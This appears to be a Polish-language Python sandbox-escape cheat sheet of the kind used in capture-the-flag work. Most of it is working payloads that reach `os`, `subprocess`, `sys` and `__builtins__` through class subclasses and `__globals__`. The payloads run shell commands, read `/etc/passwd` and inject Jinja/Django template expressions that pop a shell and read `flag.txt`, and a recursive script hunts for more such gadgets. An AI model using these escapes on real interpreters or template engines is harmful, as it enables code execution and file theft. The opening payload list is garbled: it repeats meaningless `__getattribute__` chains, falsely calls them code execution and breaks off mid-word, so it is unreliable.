#### `__getattribute__` + `__getattribute__` + `__getattribute__` + `__getattribute__` + `__new__`

This payload uses the combination of `__getattribute__`, `__getattribute__`, `__getattribute__`, `__getattribute__`, and `__new__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację metod `__getattribute__`, `__getattribute__`, `__getattribute__`, `__getattribute__` i `__new__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command').__getattribute__('command').__getattribute__('command').__getattribute__('command').__new__()
```

#### `__getattribute__` + `__getattribute__` + `__getattribute__` + `__getattribute__` + `__getattribute__`

This payload uses the combination of five `__getattribute__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację pięciu metod `__getattribute__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command').__getattribute__('command').__getattribute__('command').__getattribute__('command').__getattribute__('command')
```

#### `__getattribute__` + `__getattribute__` + `__getattribute__` + `__getattribute__` + `__getattr__`

This payload uses the combination of `__getattribute__`, `__getattribute__`, `__getattribute__`, `__getattribute__`, and `__getattr__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację metod `__getattribute__`, `__getattribute__`, `__getattribute__`, `__getattribute__` i `__getattr__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command').__getattribute__('command').__getattribute__('command').__getattribute__('command').__getattr__('command')
```

#### `__getattribute__` + `__getattribute__` + `__getattribute__` + `__getattribute__` + `__getattribute__` + `__call__`

This payload uses the combination of `__getattribute__`, `__getattribute__`, `__getattribute__`, `__getattribute__`, `__getattribute__`, and `__call__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację metod `__getattribute__`, `__getattribute__`, `__getattribute__`, `__getattribute__`, `__getattribute__` i `__call__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command').__getattribute__('command').__getattribute__('command').__getattribute__('command').__getattribute__('command').__call__()
```

#### `__getattribute__` + `__getattribute__` + `__getattribute__` + `__getattribute__` + `__getattribute__` + `__init__`

This payload uses the combination of `__getattribute__`, `__getattribute__`, `__getattribute__`, `__getattribute__`, `__getattribute__`, and `__init__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację metod `__getattribute__`, `__getattribute__`, `__getattribute__`, `__getattribute__`, `__getattribute__` i `__init__` do wykonania dowolnego kodu.

```python
().__class__.__getattribute__('command').__getattribute__('command').__getattribute__('command').__getattribute__('command').__getattribute__('command').__init__()
```

#### `__getattribute__` + `__getattribute__` + `__getattribute__` + `__getattribute__` + `__getattribute__` + `__new__`

This payload uses the combination of `__getattribute__`, `__getattribute__`, `__getattribute__`, `__getattribute__`, `__getattribute__`, and `__new__` methods to execute arbitrary code.

Ten ładunek wykorzystuje kombinację metod `__getattribute__`, `__getattribute__`, `__getattribute__`, `__getattribute__`, `__getattribute__` i `__new__` do wykon
```python
# Possible payloads once you have found the builtins
__builtins__["open"]("/etc/passwd").read()
__builtins__["__import__"]("os").system("ls")
# There are lots of other payloads that can be abused to execute commands
# See them below
```
## Globalne i lokalne

Sprawdzanie **`globals`** i **`locals`** to dobry sposób na sprawdzenie, do czego masz dostęp.
```python
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
>>> locals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}

# Obtain globals from a defined function
get_flag.__globals__

# Obtain globals from an object of a class
class_obj.__init__.__globals__

# Obtaining globals directly from loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x) ]
[<class 'function'>]

# Obtaining globals from __init__ of loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x.__init__) ]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
# Without the use of the dir() function
[ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
```
[**Poniżej znajduje się większa funkcja**](./#rekurencyjne-wyszukiwanie-wbudowanych-globali) do znalezienia dziesiątek/**setek** **miejsc**, gdzie można znaleźć **globalne zmienne**.

## Odkrywanie dowolnego wykonania

Tutaj chcę wyjaśnić, jak łatwo odkryć **bardziej niebezpieczne funkcje załadowane** i zaproponować bardziej niezawodne ataki.

#### Dostęp do podklas za pomocą bypassów

Jednym z najbardziej wrażliwych elementów tej techniki jest możliwość **dostępu do podklas bazowych**. W poprzednich przykładach było to osiągane za pomocą `''.__class__.__base__.__subclasses__()` ale istnieją **inne możliwe sposoby**:
```python
#You can access the base from mostly anywhere (in regular conditions)
"".__class__.__base__.__subclasses__()
[].__class__.__base__.__subclasses__()
{}.__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()
(1).__class__.__base__.__subclasses__()
bool.__class__.__base__.__subclasses__()
print.__class__.__base__.__subclasses__()
open.__class__.__base__.__subclasses__()
defined_func.__class__.__base__.__subclasses__()

#You can also access it without "__base__" or "__class__"
# You can apply the previous technique also here
"".__class__.__bases__[0].__subclasses__()
"".__class__.__mro__[1].__subclasses__()
"".__getattribute__("__class__").mro()[1].__subclasses__()
"".__getattribute__("__class__").__base__.__subclasses__()

# This can be useful in case it is not possible to make calls (therefore using decorators)
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]() # From https://github.com/salvatore-abello/python-ctf-cheatsheet/tree/main/pyjails#no-builtins-no-mro-single-exec

#If attr is present you can access everything as a string
# This is common in Django (and Jinja) environments
(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
```
### Wyszukiwanie niebezpiecznych bibliotek

Na przykład, wiedząc, że za pomocą biblioteki **`sys`** można **importować dowolne biblioteki**, można wyszukać wszystkie **załadowane moduły, które zaimportowały sys wewnątrz nich**:
```python
[ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
```
Jest ich wiele, a **potrzebujemy tylko jednego**, aby wykonywać polecenia:
```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
```
Możemy zrobić to samo za pomocą **innych bibliotek**, które wiemy, że mogą być używane do **wykonywania poleceń**:
```python
#os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" == x.__init__.__globals__["__name__"] ][0]["system"]("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('ls')

#subprocess
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "subprocess" == x.__init__.__globals__["__name__"] ][0]["Popen"]("ls")
[ x for x in ''.__class__.__base__.__subclasses__() if "'subprocess." in str(x) ][0]['Popen']('ls')
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen' ][0]('ls')

#builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "__bultins__" in x.__init__.__globals__ ]
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__("os").system("ls")

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
```
Ponadto, możemy nawet wyszukiwać, które moduły wczytują złośliwe biblioteki:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
for b in bad_libraries_names:
vuln_libs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and b in x.__init__.__globals__ ]
print(f"{b}: {', '.join(vuln_libs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pdb:
"""
```
Ponadto, jeśli uważasz, że **inne biblioteki** mogą być w stanie **wywoływać funkcje w celu wykonania poleceń**, możemy również **filtrować według nazw funkcji** wewnątrz możliwych bibliotek:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
for b in bad_libraries_names + bad_func_names:
vuln_funcs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) for k in x.__init__.__globals__ if k == b ]
print(f"{b}: {', '.join(vuln_funcs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pip:
pdb:
system: _wrap_close, _wrap_close
getstatusoutput: CompletedProcess, Popen
getoutput: CompletedProcess, Popen
call: CompletedProcess, Popen
Popen: CompletedProcess, Popen
spawn:
import_module:
__import__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec
load_source: NullImporter, _HackedGetData
execfile:
execute:
__builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
"""
```
## Rekurencyjne wyszukiwanie wbudowanych funkcji, globalnych...

{% hint style="warning" %}
To jest po prostu **niesamowite**. Jeśli **szukasz obiektu takiego jak globals, builtins, open lub cokolwiek innego**, po prostu użyj tego skryptu, aby **rekurencyjnie znaleźć miejsca, gdzie możesz znaleźć ten obiekt**.
{% endhint %}
```python
import os, sys # Import these to find more gadgets

SEARCH_FOR = {
# Misc
"__globals__": set(),
"builtins": set(),
"__builtins__": set(),
"open": set(),

# RCE libs
"os": set(),
"subprocess": set(),
"commands": set(),
"pty": set(),
"importlib": set(),
"imp": set(),
"sys": set(),
"pip": set(),
"pdb": set(),

# RCE methods
"system": set(),
"popen": set(),
"getstatusoutput": set(),
"getoutput": set(),
"call": set(),
"Popen": set(),
"popen": set(),
"spawn": set(),
"import_module": set(),
"__import__": set(),
"load_source": set(),
"execfile": set(),
"execute": set()
}

#More than 4 is very time consuming
MAX_CONT = 4

#The ALREADY_CHECKED makes the script run much faster, but some solutions won't be found
#ALREADY_CHECKED = set()

def check_recursive(element, cont, name, orig_n, orig_i, execute):
# If bigger than maximum, stop
if cont > MAX_CONT:
return

# If already checked, stop
#if name and name in ALREADY_CHECKED:
#    return

# Add to already checked
#if name:
#    ALREADY_CHECKED.add(name)

# If found add to the dict
for k in SEARCH_FOR:
if k in dir(element) or (type(element) is dict and k in element):
SEARCH_FOR[k].add(f"{orig_i}: {orig_n}.{name}")

# Continue with the recursivity
for new_element in dir(element):
try:
check_recursive(getattr(element, new_element), cont+1, f"{name}.{new_element}", orig_n, orig_i, execute)

# WARNING: Calling random functions sometimes kills the script
# Comment this part if you notice that behaviour!!
if execute:
try:
if callable(getattr(element, new_element)):
check_recursive(getattr(element, new_element)(), cont+1, f"{name}.{new_element}()", orig_i, execute)
except:
pass
